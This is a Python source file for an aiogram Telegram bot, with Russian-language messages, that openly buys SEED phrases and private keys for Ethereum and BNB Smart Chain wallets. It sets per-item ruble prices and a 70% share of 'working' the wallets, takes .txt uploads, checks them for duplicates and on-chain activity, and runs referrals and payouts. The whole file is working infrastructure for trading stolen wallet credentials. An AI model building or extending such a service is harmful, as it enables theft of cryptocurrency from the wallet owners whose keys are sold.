# main.py
import asyncio
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramForbiddenError
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity

class UploadFile(StatesGroup):
    waiting_file = State()

class SupportState(StatesGroup):
    waiting_for_message = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()

# Клавиатуры
main_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="📂 Отправить файл", callback_data="upload")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals")],
        [InlineKeyboardButton(text="💰 Баланс", callback_data="balance")],
        [InlineKeyboardButton(text="💳 Вывести", callback_data="withdraw")],
        [InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
        [InlineKeyboardButton(text="ℹ️ Правила", callback_data="rules")],
    ]
)

back_menu = InlineKeyboardMarkup(
    inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back")]]
)

@dp.message(CommandStart())
async def start_cmd(message: Message):
    print(f"📩 /start от {message.from_user.id}")
    try:
        args = message.text.split()
        referrer_id = None
        if len(args) > 1 and args[1].startswith("ref_"):
            try:
                referrer_id = int(args[1].replace("ref_", ""))
            except:
                pass

        await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
        if referrer_id and referrer_id != message.from_user.id:
            await register_referral(message.from_user.id, referrer_id)

        ref_link = f"https://t.me/your_bot_username_bot?start=ref_{message.from_user.id}"
        text = (
            "👋 <b>Добро пожаловать!</b>\n\n"
            "🛒 <b>Скупка SEED-фраз и Private-ключей</b> с транзакциями в сетях:\n"
            "• <b>ERC-20 (Ethereum)</b>\n"
            "• <b>BEP-20 (BNB Smart Chain)</b>\n\n"
            "💰 <b>Цены:</b>\n"
            "• 🌱 SEED-фраза — <b>235₽</b>\n"
            "• 🔑 Private-key — <b>145₽</b>\n\n"
            "💸 <b>ПЛАТИМ САМУЮ ВЫСОКУЮ ЦЕНУ</b> + <b>70% от отработки</b> помимо прайса!\n\n"
            "🔝 <b>Наши преимущества:</b>\n"
            "├ 🤖 Автоматизация\n"
            "├ ⚡ Быстрые выплаты\n"
            "├ 🚀 Высокая скорость\n"
            "└ 🔍 Глубокая проверка\n\n"
            "🕒 <b>Выплаты каждый день в 23:00 (МСК)</b>\n"
            "Все заработанные средства будут отправлены автоматически."
        )
        await message.answer(text, reply_markup=main_menu)
    except TelegramForbiddenError:
        pass
    except Exception as e:
        print(f"❌ Ошибка в start: {e}")

# --- Кнопки ---
@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    print(f"📁 Кнопка 'upload' нажата пользователем {callback.from_user.id}")
    try:
        await callback.message.answer(
            "📂 Загрузите файл в формате <b>.txt</b>.\n\n"
            "📌 Поддерживается до <b>20 МБ</b>.\n"
            "🔍 Проверка: уникальность + активность"
        )
        await state.set_state(UploadFile.waiting_file)
        await callback.answer()
    except Exception as e:
        print(f"❌ Ошибка в upload: {e}")
        await callback.answer("Ошибка", show_alert=True)

@dp.callback_query(F.data == "profile")
async def profile_cb(callback: CallbackQuery):
    print(f"👤 Кнопка 'profile' нажата пользователем {callback.from_user.id}")
    try:
        user = await get_user(callback.from_user.id)
        if not user:
            await callback.message.edit_text("❌ Ошибка загрузки профиля.")
            await callback.answer()
            return

        text = (
            f"👤 <b>Профиль</b>\n\n"
            f"🆔 ID: <code>{user['user_id']}</code>\n"
            f"📝 Строк: {user['total_lines']}\n"
            f"🌱 SEED: {user['unique_seeds']}\n"
            f"🔑 Keys: {user['unique_keys']}\n"
            f"💰 Заработано: {user['balance']:.2f} RUB"
        )
        await callback.message.edit_text(text, reply_markup=back_menu)
        await callback.answer()
    except Exception as e:
        print(f"❌ Ошибка в profile: {e}")
        await callback.answer("Ошибка", show_alert=True)

@dp.callback_query(F.data == "back")
async def back_cb(callback: CallbackQuery):
    print(f"🔙 Кнопка 'back' нажата")
    try:
        await callback.message.edit_text("Главное меню:", reply_markup=main_menu)
        await callback.answer()
    except Exception as e:
        print(f"❌ Ошибка в back: {e}")

# --- Остальные кнопки (пример) ---
@dp.callback_query(F.data == "rules")
async def rules_cb(callback: CallbackQuery):
    text = (
        "📜 <b>Правила</b>\n\n"
        "1. Только .txt файлы\n"
        "2. Только активные кошельки (ETH/BNB)\n"
        "3. Обман = бан\n"
        "4. Выплаты в 23:00 (МСК)"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

# --- process_file, support, withdraw и т.д. остаются как в предыдущих версиях ---

async def main():
    await init_db()
    print("✅ База данных инициализирована")
    print("🚀 Бот запущен в режиме polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
